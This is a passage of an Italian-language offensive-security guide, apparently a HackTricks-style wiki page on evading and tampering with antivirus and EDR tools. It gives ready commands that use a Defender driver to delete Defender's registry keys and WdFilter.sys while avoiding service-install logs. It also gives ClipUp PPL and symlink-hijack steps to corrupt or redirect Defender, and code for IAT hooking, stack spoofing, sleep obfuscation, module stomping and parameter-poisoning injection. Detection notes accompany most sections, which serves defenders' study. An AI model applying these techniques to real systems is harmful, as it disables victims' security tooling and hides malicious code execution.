Gli ID delle azioni accettate espongono queste primitive del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dati dell'elemento | Risultato |
| --- | --- | --- |
| 1 | `[percorso UTF-16]` | Elimina un file, anche se bloccato |
| 2 | `[percorso UTF-16]` | Rimuove una directory vuota |
| 3 | `[flag][sorgente][destinazione]` | Sposta un file in un percorso protetto scelto dall'attaccante; una destinazione vuota comporta l'eliminazione |
| 4 | `[flag][percorso della chiave]` | Elimina ricorsivamente una chiave del registro |
| 5 | `[flag][percorso della chiave + "\\" + valore]` | Elimina un valore del registro |
| 6 | `[flag][tipo][dimensione][percorso della chiave + "\\" + valore][dati]` | Crea/aggiorna un valore del registro e crea i percorsi delle chiavi mancanti |

Per le azioni 5 e 6, il separatore chiave/valore sul wire è composto da **due barre rovesciate consecutive**; un percorso formattato secondo le convenzioni non verrà suddiviso correttamente. Il file di feedback rispecchia in gran parte la richiesta, ma i primi quattro byte dei dati di ogni elemento diventano il relativo `NTSTATUS`. Per le azioni 1 e 2, che non hanno un campo flag iniziale, BTR sposta il percorso nei quattro byte riservati finali per fare spazio a quello stato.<sup>[[36]](#references)</sup>

### Flusso di lavoro di `BTR_CLI` e finestra di avvio anticipato

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa l'intera catena: estrae `BTR.sys` da Defender locale, crea `<random>.sys:changelist` e uno stream di feedback, serializza, calcola i checksum e crittografa azioni concatenate, crea direttamente la chiave del registro dei servizi, quindi chiama `NtLoadDriver` per `-trigger now` oppure lascia il driver come driver di avvio del sistema per `-trigger boot`. La configurazione diretta del registro evita il normale percorso SCM `CreateServiceW` e quindi **non** genera l'evento ID 7045 di installazione del servizio. Gli artefatti attivati all'avvio possono essere rimossi in seguito con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` non è utilizzabile perché BTR esegue operazioni di I/O sui file da `DriverEntry` prima che lo stack di archiviazione e il collegamento `SystemRoot` siano pronti. `Start=1`, insieme al gruppo ad alta priorità `Boot Bus Extender`, viene invece eseguito nella Fase 1: NTFS è utilizzabile, ma molti driver di sicurezza con avvio di sistema e servizi EDR in modalità utente non sono ancora stati inizializzati. I filtri con avvio all'avvio, come `WdFilter`, potrebbero essere già caricati, ma BTR può rimuoverne i binari o la configurazione del servizio prima dell'avvio successivo e può eliminare gli eseguibili dei servizi prima che SCM li avvii. ELAM non colma questa lacuna perché BTR viene eseguito dopo la valutazione dei driver di avvio e dispone di una firma Microsoft valida.<sup>[[36]](#references)</sup>

Più azioni vengono eseguite in un'unica transazione. La PoC antepone l'Azione 1 per il percorso hard-coded `\SystemRoot\Temp\BootClean.log`: BTR crea questo log, poi esegue la propria richiesta di eliminazione e lo rimuove prima di scaricarsi. Questo riduce le prove, mentre collocare il feedback in `<random>.sys:<random>.dat` consente di rimuovere insieme il driver e i due stream.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlazioni di rilevamento ad alto segnale

Le regole basate solo sulla firma e la blocklist Microsoft dei driver vulnerabili non affrontano l'abuso delle funzionalità previste di BTR. Preferisci queste correlazioni comportamentali, distinguendo la legittima provenienza da Defender da un launcher qualsiasi.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creazione di `.sys:changelist` è universale per lo staging di BTR. Un ADS `.dat` associato allo stesso `.sys` è particolarmente sospetto, perché Defender normalmente colloca il feedback in `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 senza System 7045:** correla la creazione diretta di `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenente `Args=...:changelist` e `Group=Boot Bus Extender` in assenza di un evento di installazione SCM corrispondente.
- **Sysmon 6 -> 23:** correla il caricamento di un driver BTR noto, proveniente da una provenienza diversa da Defender, con la successiva eliminazione di file attribuita a `System`/PID 4, in particolare per i binari di sicurezza.
- **Sysmon 11 -> 23:** genera un alert per la rapida creazione e cancellazione di `\SystemRoot\Temp\BootClean.log` da parte di `System`/PID 4.
- Limita e verifica l'assegnazione/abilitazione di `SeLoadDriverPrivilege`; una firma Microsoft da sola non è sufficiente a garantire l'affidabilità quando il driver di uno strumento di sicurezza viene messo in staging da `cmd.exe`, PowerShell o un processo sconosciuto.

## Abusare di Protected Process Light (PPL) per manomettere AV/EDR con LOLBIN

Protected Process Light (PPL) applica una gerarchia di firmatari/livelli, in modo che solo i processi protetti con livello uguale o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se puoi avviare legittimamente un binario abilitato per PPL e controllarne gli argomenti, puoi convertire una funzionalità innocua (ad es. la registrazione) in una primitiva di scrittura vincolata e supportata da PPL contro le directory protette utilizzate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa consente a un processo di essere eseguito come PPL
- L'EXE di destinazione (e tutte le DLL caricate) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- È necessario richiedere un livello di protezione compatibile con il firmatario del binario (ad es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i firmatari antimalware, `PROTECTION_LEVEL_WINDOWS` per i firmatari Windows). Livelli errati impediranno la creazione.

Vedi anche un'introduzione più ampia a PP/PPL e alla protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti launcher
- Helper open source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE di destinazione):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Modalità d'uso:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitive LOLBIN: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` avvia un nuovo processo di se stesso e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con supporto PPL.
- ClipUp non riesce a interpretare percorsi contenenti spazi; usa percorsi brevi 8.3 per indicare posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elenca i nomi brevi: `dir /x` in ogni directory padre.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avvia il LOLBIN compatibile con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (ad es., CreateProcessAsPPL).
2) Passa a ClipUp l'argomento del percorso del log per forzare la creazione di un file in una directory AV protetta (ad es., Defender Platform). Se necessario, usa nomi brevi 8.3.
3) Se l'AV tiene normalmente aperto/bloccato il binario di destinazione mentre è in esecuzione (ad es., MsMpEng.exe), pianifica la scrittura all'avvio, prima che parta l'AV, installando un servizio ad avvio automatico che venga eseguito con certezza per primo. Verifica l'ordine di avvio con Process Monitor (registrazione all'avvio).
4) Al riavvio, la scrittura con supporto PPL avviene prima che l'AV blocchi i suoi binari, danneggiando il file di destinazione e impedendone l'avvio.

Esempio di invocazione (percorsi oscurati/accorciati per sicurezza):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Note e vincoli
- Non puoi controllare i contenuti che ClipUp scrive, ma solo la posizione; questa primitiva è adatta alla corruzione, non all'inserimento preciso di contenuti.
- Sono necessari privilegi di amministratore locale/SYSTEM per installare/avviare un servizio e una finestra temporale per il riavvio.
- Il tempismo è fondamentale: il target non deve essere aperto; l'esecuzione all'avvio evita i blocchi dei file.

Rilevamenti
- Creazione di processi `ClipUp.exe` con argomenti insoliti, soprattutto se avviati da processi padre non standard, durante l'avvio.
- Nuovi servizi configurati per avviare automaticamente binari sospetti e avviati sistematicamente prima di Defender/AV. Esamina la creazione/modifica dei servizi prima degli errori di avvio di Defender.
- Monitoraggio dell'integrità dei file dei binari di Defender/delle directory Platform; creazioni/modifiche inaspettate da parte di processi con flag di processo protetto.
- Telemetria ETW/EDR: cerca processi avviati con `CREATE_PROTECTED_PROCESS` e usi anomali del livello PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limita i binari firmati che possono essere eseguiti come PPL e i relativi processi padre; blocca l'esecuzione di ClipUp al di fuori dei contesti legittimi.
- Gestione dei servizi: limita la creazione/modifica dei servizi ad avvio automatico e monitora le modifiche all'ordine di avvio.
- Assicurati che la protezione antimanomissione di Defender e le protezioni di avvio anticipato siano abilitate; esamina gli errori di avvio che indicano una corruzione dei binari.
- Valuta di disabilitare la generazione dei nomi brevi 8.3 nei volumi che ospitano strumenti di sicurezza, se compatibile con il tuo ambiente (esegui test approfonditi).

## Manomissione di Microsoft Defender tramite Symlink Hijack della cartella delle versioni Platform

Windows Defender sceglie la piattaforma da cui viene eseguito enumerando le sottocartelle in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione in ordine lessicografico più alta (ad es. `4.18.25070.5-0`), quindi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione si basa sulle voci delle directory, inclusi i reparse point di tipo directory (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender a un percorso scrivibile da un attaccante e ottenere DLL sideloading o causare un'interruzione del servizio.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di riavviare o attivare una nuova selezione della piattaforma Defender (riavvio del servizio all'avvio)
- Sono sufficienti gli strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della piattaforma si basa sulle voci delle directory e sceglie la versione più alta in ordine lessicografico senza verificare che il percorso di destinazione rimandi a un percorso protetto/considerato attendibile.

Procedura dettagliata (esempio)
1) Prepara una copia scrivibile della cartella della piattaforma corrente, ad es. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea all'interno di Platform un symlink di directory con una versione superiore che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo in `C:\TMP\AV\` e la configurazione del servizio/registro che riflette tale percorso.

Opzioni post-exploitation
- DLL sideloading/code execution: Inserisci/sostituisci DLL che Defender carica dalla propria directory applicativa per eseguire codice nei processi di Defender. Vedi la sezione precedente: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovi il symlink della versione, così al successivo avvio il percorso configurato non verrà risolto e Defender non riuscirà ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Tieni presente che questa tecnica, da sola, non consente l'escalation dei privilegi: richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

I red team possono spostare l'evasione runtime dall'impianto C2 al modulo target stesso, applicando un hook alla sua Import Address Table (IAT) e instradando le API selezionate tramite codice position-independent (PIC) controllato dall'attaccante. Questo estende l'evasione oltre la ridotta superficie di API esposta da molti kit (ad es. CreateProcessA) e applica le stesse protezioni anche a BOF e DLL di post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio di alto livello
- Carica uno script PIC insieme al modulo target tramite un reflective loader (anteponendolo o come componente companion). Il PIC deve essere autonomo e position-independent.
- Durante il caricamento della DLL host, esamina il suo IMAGE_IMPORT_DESCRIPTOR e modifica le voci IAT degli import target (ad es. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) affinché puntino a wrapper PIC essenziali.
- Ogni wrapper PIC esegue le tecniche di evasione prima di effettuare una tail-call all'indirizzo dell'API reale. Le tecniche di evasione tipiche includono:
  - Mascheramento/ripristino della memoria attorno alla chiamata (ad es. cifrare le regioni del beacon, passare da RWX a RX, modificare nomi/permessi delle pagine), quindi ripristinare lo stato dopo la chiamata.
  - Call-stack spoofing: costruire uno stack legittimo e trasferire il controllo all'API target in modo che l'analisi del call stack risolva i frame attesi.<sup>[[9]](#references)</sup>
- Per garantire la compatibilità, esporta un'interfaccia che consenta a uno script Aggressor (o equivalente) di registrare le API da sottoporre a hook per Beacon, BOF e DLL di post-exploitation.

Perché usare l'IAT hooking in questo caso
- Funziona con qualsiasi codice che utilizzi l'import sottoposto a hook, senza modificare il codice dello strumento né fare affidamento su Beacon per effettuare il proxy di API specifiche.
- Copre le DLL di post-exploitation: applicare un hook a LoadLibrary* consente di intercettare il caricamento dei moduli (ad es. System.Management.Automation.dll, clr.dll) e applicare alle relative chiamate API le stesse tecniche di mascheramento/evasione dello stack.
- Ripristina un uso affidabile dei comandi di post-exploitation che avviano processi, contro i rilevamenti basati sul call stack, applicando un wrapper a CreateProcessA/W.

Schema minimo di IAT hook (pseudocodice C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocazioni/ASLR e prima del primo uso dell’import. Loader reflective come TitanLdr/AceLdr dimostrano l’hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper piccoli e sicuri per PIC; risolvi la vera API usando il valore originale dell’IAT acquisito prima della patch oppure tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine scrivibili ed eseguibili.

Stub di call-stack spoofing
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate falsa (indirizzi di ritorno che puntano a moduli benigni) e poi passano alla vera API.
- Questo aggira i rilevamenti che si aspettano stack canonici da Beacon/BOF per le API sensibili.
- Abbinalo a tecniche di stack cutting/stack stitching per posizionarti nei frame attesi prima del prologo dell’API.

Integrazione operativa
- Preponi il loader reflective alle DLL post-ex, così PIC e hook si inizializzano automaticamente al caricamento della DLL.
- Usa uno script Aggressor per registrare le API target, così Beacon e BOF beneficiano in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Considerazioni per detection/DFIR
- Integrità dell’IAT: voci che puntano a indirizzi non-image (heap/anon); verifica periodica dei puntatori agli import.
- Anomalie dello stack: indirizzi di ritorno non appartenenti a immagini caricate; transizioni improvvise a PIC non-image; discendenza RtlUserThreadStart incoerente.
- Telemetria del loader: scritture nell’IAT in-process, attività precoce in DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione del caricamento delle immagini: se fai hooking di LoadLibrary*, monitora i caricamenti sospetti di assembly automation/clr correlati a eventi di memory masking.

Componenti ed esempi correlati
- Loader reflective che eseguono patching dell’IAT durante il caricamento (es. TitanLdr, AceLdr)
- Hook di memory masking (es. simplehook) e PIC per stack cutting (stackcutting)
- Stub PIC per call-stack spoofing (es. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hook IAT in fase di import tramite un PICO residente

Se controlli un loader reflective, puoi fare hooking degli import **durante** `ProcessImports()` sostituendo il puntatore del loader a `GetProcAddress` con un resolver personalizzato che controlla prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crea un **PICO residente** (oggetto PIC persistente) che sopravviva dopo che il PIC transitorio del loader si è liberato.
- Esporta una funzione `setup_hooks()` che sovrascrive il resolver degli import del loader (es. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, ignora gli import ordinali e usa una ricerca degli hook basata su hash, come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook al momento del link con le voci Crystal Palace `addhook "MODULE$Func" "hook"`. L’hook resta valido perché si trova nel PICO residente.

Questo consente **la redirezione dell’IAT in fase di import** senza patchare la sezione di codice della DLL caricata dopo il load.

### Forzare gli import intercettabili quando il target usa il PEB-walking

Gli hook in fase di import si attivano solo se la funzione è effettivamente nell’IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza una voce di import), forza un import reale affinché il percorso `ProcessImports()` del loader lo intercetti:

- Sostituisci la risoluzione degli export basata su hash (es. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore genera una voce IAT, consentendo l’intercettazione quando il loader reflective risolve gli import.

### Offuscamento Ekko-style durante sleep/idle senza patchare `Sleep()`

Invece di patchare `Sleep`, fai hooking delle **primitive effettive di attesa/IPC** usate dall’impianto (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per le attese lunghe, racchiudi la chiamata in una catena di offuscamento Ekko-style che cifra l’immagine in memoria durante l’inattività:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` predisposti.
- Catena tipica (x64): imposta l’immagine a `PAGE_READWRITE` → cifra con RC4 tramite `advapi32!SystemFunction032` sull’intera immagine mappata → esegui l’attesa bloccante → decifra con RC4 → **ripristina i permessi per sezione** scorrendo le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un modello `CONTEXT`; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ciascun passaggio.

Dettaglio operativo: restituisci “success” per le attese lunghe (es. `WAIT_OBJECT_0`), così il chiamante prosegue mentre l’immagine è mascherata. Questo schema nasconde il modulo agli scanner durante le finestre di inattività ed evita la classica firma del “patched `Sleep()`”.

Idee per la detection (basate sulla telemetria)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- Uso di `advapi32!SystemFunction032` su buffer contigui di grandi dimensioni, pari a un’immagine.
- `VirtualProtect` su intervalli ampi, seguito dal ripristino personalizzato dei permessi per sezione.

### Registrazione CFG a runtime per i gadget di sleep-obfuscation

Nei target con CFG abilitato, il primo salto indiretto verso un gadget a metà funzione, come `jmp [rbx]` o `jmp rdi`, di solito causa il crash del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadati CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken nei processi protetti:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta usata dalla catena con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e voci `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all’interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` deve iniziare dalla **base dell’immagine** e coprire **l’intera dimensione dell’immagine**.
- Per le regioni mappate manualmente/PIC/stomped, usa invece la **base dell’allocazione** e la dimensione dell’allocazione.
- Contrassegna non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscall di wait/event) e qualsiasi sezione eseguibile controllata dall’attaccante che diventerà una destinazione indiretta.

Questo trasforma le catene di sleep in stile ROP/JOP da «funziona solo nei processi senza CFG» a primitive riutilizzabili per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Stack spoofing compatibile con CET per i thread in sleep

La sostituzione completa di `CONTEXT` è rumorosa e può non funzionare sui sistemi CET Shadow Stack, perché un `Rip` contraffatto deve comunque corrispondere allo shadow stack hardware. Un pattern più sicuro per il sleep-masking è:<sup>[[30]](#references)</sup>

- Scegli un altro thread dello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Acquisisci il contesto reale del thread in sleep con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto contraffatto, lasciando intatto lo stato contraffatto di `Rsp`/stack.
- Durante la finestra di sleep, copia l’`NT_TIB` del thread contraffatto nel TEB corrente, così gli stack walker eseguono l’unwind all’interno di un intervallo di stack legittimo.
- Al termine dell’attesa, ripristina il TIB originale e il contesto del thread.

Questo mantiene un instruction pointer coerente con CET e inganna gli stack walker EDR che si affidano ai metadati dello stack del TEB per convalidare gli unwind.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue è troppo caratteristico, la stessa sequenza di sleep-encrypt-spoof-restore può essere eseguita da un thread helper sospeso usando APC accodate:<sup>[[27]](#references)</sup>

- Crea un thread helper con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC predisposti con `NtQueueApcThread` e gestiscili con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell’heap invece che nello stack dell’helper, per evitare di esaurire lo stack predefinito del thread da 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l’evento di avvio e bloccarsi.
- Sospendi il thread principale prima di ripristinare il TIB/contesto (`NtSuspendThread` → ripristino → `NtResumeThread`) per ridurre la finestra di race in cui uno scanner potrebbe rilevare uno stack ripristinato solo parzialmente.

Questo sostituisce la firma `CreateTimerQueueTimer` + `NtContinue` con una firma thread helper/APC, mantenendo gli stessi obiettivi di mascheramento RC4 e stack spoofing.

Altre idee per la detection
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, attese o dispatch APC.
- `GetThreadContext`/`SetThreadContext` usati attorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di firme di gadget brevi come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all’interno di moduli firmati.


## Precision Module Stomping

Il module stomping esegue i payload dalla **sezione `.text` di una DLL già mappata nel processo target**, invece di allocare memoria eseguibile privata evidente o caricare una nuova DLL sacrificale. Il target da sovrascrivere dovrebbe essere un’**immagine caricata e supportata su disco**, il cui spazio di codice possa contenere il payload senza corrompere percorsi di codice ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Selezione affidabile del target

Il module stomping ingenuo contro moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una regione di codice troppo piccola causerà il crash del processo. Un flusso di lavoro più affidabile è:

1. Enumera i moduli del processo target e conserva un **elenco di inclusione con i soli nomi** delle DLL già caricate.
2. Crea prima il payload e annotane la **dimensione esatta in byte**.
3. Esamina le DLL candidate sul disco e confronta la sezione PE **`.text` `Misc_VirtualSize`** con la dimensione del payload. È più importante della dimensione del file, perché riflette la dimensione della sezione eseguibile **quando viene mappata in memoria**.
4. Analizza la **Export Address Table (EAT)** e scegli l’RVA di una funzione esportata come offset iniziale dello stomp.
5. Calcola il **raggio d’impatto**: se il payload supera i limiti della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Helper di ricognizione/selezione tipici osservati sul campo:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Note operative
- Preferisci le DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/dei caricamenti di immagini inattesi.
- Preferisci gli export eseguiti raramente dall’applicazione target; altrimenti, i normali percorsi di codice potrebbero raggiungere i byte sovrascritti prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni richiedono spesso di sostituire l’inserimento della shellcode come string literal con un **byte-array/inizializzatore tra parentesi graffe**, così che l’intero buffer venga rappresentato correttamente nel codice dell’injector.

Idee per il rilevamento
- Scritture remote in pagine eseguibili associate a immagini (`MEM_IMAGE`, `PAGE_EXECUTE*`), anziché nelle più comuni allocazioni private RWX/RX.
- Entry point degli export i cui byte in memoria non corrispondono più al file di riferimento su disco.
- Thread remoti o pivot del contesto che iniziano l’esecuzione all’interno di un export di una DLL legittima i cui byte iniziali sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` dirette alle pagine `.text` delle DLL e seguite dalla creazione di thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / evasione EDR** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un processo target già in esecuzione, sfrutta il fatto che Windows **copia parametri di avvio selezionati di `CreateProcessW` nel processo figlio** e li memorizza in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carrier avvelenabili copiati da `CreateProcessW`

I carrier utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei carrier:

- `lpCommandLine` deve puntare a **memoria scrivibile** per `CreateProcessW` ed è limitato a **32,767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un blocco di ambiente Unicode composto da stringhe `NOME=VALORE\0` consecutive e terminato da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi la corrispondenza con `ShellInfo` va considerata un dettaglio implementativo, non un contratto documentato stabile.

In questo modo, la normale creazione del processo diventa il **meccanismo di trasferimento del payload**. L’operatore crea il processo figlio con dati di avvio controllati dall’attaccante e lascia che Windows esegua la copia tra processi.

### Flusso di lookup remoto senza API di scrittura remota

Dopo la creazione del processo figlio, individua il buffer copiato usando primitive di **sola lettura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottieni `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggi il `PEB` remoto
3. Segui `PEB.ProcessParameters`
4. Leggi `RTL_USER_PROCESS_PARAMETERS`
5. Usa il puntatore selezionato:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flusso minimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Esecuzione del buffer dei parametri copiato

La regione dei parametri copiata è solitamente `RW`, non eseguibile. Una chain P3 comune è:

1. Creare normalmente il processo (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l’handle del thread principale già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l’esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivere `RIP`)

A differenza dei workflow classici di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il context può essere modificato direttamente usando l’handle del thread principale restituito.

Questo evita diverse API comunemente monitorate per l’injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limite dei byte nulli e shellcode a fasi

Tutti e tre i carrier sono **stringhe o dati simili a stringhe**, quindi un payload grezzo contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è un **primo stage privo di byte nulli** che ricostruisce le costanti a runtime e poi carica un secondo stage arbitrario.

Un pattern semplice consiste nella sintesi di costanti basata su XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Questo consente al primo stage di creare stringhe sullo stack, argomenti API, percorsi DLL o un loader di shellcode di secondo stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal primo stage

Quando il primo stage deve chiamare API come `LoadLibraryA`, può:

- inserire la stringa/il buffer nello stack del processo target
- riservare i **32 byte di shadow space x64**
- impostare `RCX`, `RDX`, `R8`, `R9` su costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

